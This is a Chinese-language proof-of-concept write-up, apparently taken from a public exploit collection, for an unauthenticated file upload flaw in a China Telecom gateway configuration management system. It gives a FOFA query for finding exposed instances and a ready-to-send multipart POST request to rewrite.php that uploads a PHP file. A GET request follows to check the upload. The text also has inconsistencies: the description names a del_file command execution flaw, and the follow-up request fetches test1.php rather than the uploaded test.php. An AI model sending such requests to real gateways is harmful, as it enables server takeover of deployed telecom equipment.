# 电信网关配置管理系统rewrite存在文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">中国电信集团有限公司（英文名称“China Telecom”、简称“中国电信”）成立于2000年9月，是中国特大型国有通信企业、上海世博会全球合作伙伴。电信网关配置管理系统del_file存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 电信网关配置管理系统

# 三、资产测绘
+ fofa`body="img/dl.gif" && title="系统登录"`
+ 特征


# 四、漏洞复现
```java
POST /manager/teletext/material/rewrite.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
Connection: close
 
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="tmp_name"; filename="test.php"
Content-Type: image/png
 
<?php echo md5('666');unlink(__FILE__);?>
------WebKitFormBoundaryOKldnDPT
Content-Disposition: form-data; name="uploadtime"
 
 
------WebKitFormBoundaryOKldnDPT--
```


上传文件地址

```java
GET /xmedia/material/test1.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ukcgt02yr1b4yu4l>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
